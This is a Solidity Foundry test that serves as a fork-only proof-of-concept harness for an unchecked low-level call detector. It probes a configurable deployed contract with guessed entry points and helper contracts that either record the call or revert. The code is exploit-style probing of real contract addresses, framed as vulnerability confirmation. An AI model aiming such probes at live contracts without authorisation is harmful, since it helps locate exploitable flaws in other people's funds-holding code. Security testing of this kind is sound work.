// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unchecked low-level call return
/// @notice Detector: unchecked-call / bytecode-unchecked-call. The target
///         does a low-level call and IGNORES whether it succeeded. If the
///         callee reverts, the target still records success -- funds, state,
///         or accounting diverge from reality.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. The entry point that makes the unchecked
///      call is a GUESS, so every plausible name is tried in turn and the
///      result is judged on the OBSERVABLE -- the target forwarded to the
///      callee AND completed although that callee reverted -- never on the
///      bare fact that a call returned.

contract Reverter {
    receive() external payable {
        revert("callee reverts");
    }

    fallback() external payable {
        revert("callee reverts");
    }
}

/// Flips its own storage when invoked, so the harness can tell a target that
/// really forwards to the callee from a no-op that merely returns.
contract Recorder {
    bool public called;

    receive() external payable {
        called = true;
    }

    fallback() external payable {
        called = true;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Build the calldata for one candidate entry point with the callee
    /// address (Recorder or Reverter) spliced in at `shape`.
    ///   shape 0 = f(address,bytes)
    ///   shape 1 = f(bytes)              -- callee not injectable (stored)
    ///   shape 2 = f(address[],bytes[])
    function _encode(bytes4 sel, uint8 shape, address callee) internal pure returns (bytes memory) {
        if (shape == 0) return abi.encodeWithSelector(sel, callee, bytes(""));
        if (shape == 1) return abi.encodeWithSelector(sel, bytes(""));
        address[] memory targets = new address[](1);
        targets[0] = callee;
        bytes[] memory payloads = new bytes[](1);
        payloads[0] = bytes("");
        return abi.encodeWithSelector(sel, targets, payloads);
    }

    /// Try one entry point and accept it only when the OBSERVABLE changes,
    /// never when the call merely returns. Two things must hold:
    ///   (a) the entry really forwards to the callee we hand it -- the
    ///       Recorder's storage flips, which a no-op never does; and
    ///   (b) handed a callee that reverts, the target still completes.
    /// A bare "the call returned" is exactly what a no-op or an already
    /// guarded function produces, so it is not evidence on its own.
    function _attempt(
        address attacker,
        uint256 before,
        string memory label,
        bytes4 sel,
        uint8 shape
    ) internal returns (string memory) {
        Recorder rec = new Recorder();
        Reverter rev = new Reverter();

        // Phase 1 -- does the entry forward to a callee at all?
        vm.prank(attacker);
        (bool probeOk,) = target.call(_encode(sel, shape, address(rec)));
        bool forwards = probeOk && rec.called();

        // Phase 2 -- with a guaranteed-reverting callee, does the target
        // still return? A target that checks or bubbles the failure reverts.
        vm.prank(attacker);
        (bool ok,) = target.call(_encode(sel, shape, address(rev)));
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (forwards && ok) {
            console.log(
                "  forwarded to callee and completed despite its revert; target balance delta:",
                before > target.balance ? before - target.balance : 0
            );
            return label;
        }
        return "";
    }

    /// The entry point is a GUESS when the target is unverified, and a wrong
    /// guess is not harmless: it reports "not reproduced" for a vulnerability
    /// that exists under another name. So try the plausible ones first.
    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(attacker, before, "execute(address,bytes)", bytes4(keccak256("execute(address,bytes)")), 0);
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "call(address,bytes)", bytes4(keccak256("call(address,bytes)")), 0);
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "run(address,bytes)", bytes4(keccak256("run(address,bytes)")), 0);
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "invoke(address,bytes)", bytes4(keccak256("invoke(address,bytes)")), 0);
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "forward(address,bytes)", bytes4(keccak256("forward(address,bytes)")), 0);
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "execute(bytes)", bytes4(keccak256("execute(bytes)")), 1);
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "multicall(address[],bytes[])", bytes4(keccak256("multicall(address[],bytes[])")), 2);
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 before = target.balance;
        string memory used = _tryEntry(attackerEOA, before);
        console.log("unchecked-call entry point that swallowed a reverted sub-call:", used);
        console.log("target balance before:", before);
        console.log("target balance after:", target.balance);

        // Success is the OBSERVABLE, not a call returning: `used` is only set
        // when the target forwarded to the callee AND completed although that
        // callee reverted.
        assertTrue(
            bytes(used).length > 0,
            "no unchecked-call entry point reproduced. Tried execute(address,bytes), call(address,bytes), run(address,bytes), invoke(address,bytes), forward(address,bytes), execute(bytes), multicall(address[],bytes[]). This does NOT establish safety: the function may have another name, take other arguments, be payable, or be reachable only by a specific caller, and an entry that never forwards to the callee we hand it cannot be told apart from a guarded one here."
        );
    }
}
